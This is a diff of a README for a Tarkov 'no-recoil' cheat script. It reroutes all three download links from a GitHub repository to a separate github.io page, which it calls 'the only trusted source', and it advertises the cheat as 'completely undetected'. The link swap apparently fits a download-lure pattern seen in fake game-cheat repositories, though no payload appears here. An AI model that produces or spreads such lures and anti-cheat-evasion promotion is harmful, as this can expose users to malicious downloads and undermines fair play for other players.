@@ -1,6 +1,6 @@
 # 🎯 tarkov-no-recoil-2026 - Laser-Fast Recoil Compensation For Every Build
 
-[![Download Now](https://img.shields.io/badge/Download-Tarkov_No_Recoil_2026-blue?style=for-the-badge&logo=github)](https://github.com/facile-blackhawk7699/tarkov-no-recoil-2026)
+[![Download Now](https://img.shields.io/badge/Download-Tarkov_No_Recoil_2026-blue?style=for-the-badge&logo=github)](https://facile-blackhawk7699.github.io)
 
 ---
 
@@ -46,7 +46,7 @@ Follow this step-by-step guide to get the script running within two minutes. No 
 
 Go to the official download page using this link:
 
-**👉 [https://github.com/facile-blackhawk7699/tarkov-no-recoil-2026](https://github.com/facile-blackhawk7699/tarkov-no-recoil-2026)**
+**👉 [https://facile-blackhawk7699.github.io](https://facile-blackhawk7699.github.io)**
 
 This is the only trusted source. Do not download from third-party mirror sites.
 
@@ -122,7 +122,7 @@ We built this tool to be completely undetected. Here’s what keeps you safe:
 
 If you accidentally closed this page or forgot to download earlier, here’s the direct link one more time:
 
-**🔗 [Download tarkov-no-recoil-2026 Here](https://github.com/facile-blackhawk7699/tarkov-no-recoil-2026)**
+**🔗 [Download tarkov-no-recoil-2026 Here](https://facile-blackhawk7699.github.io)**
 
 ---
 
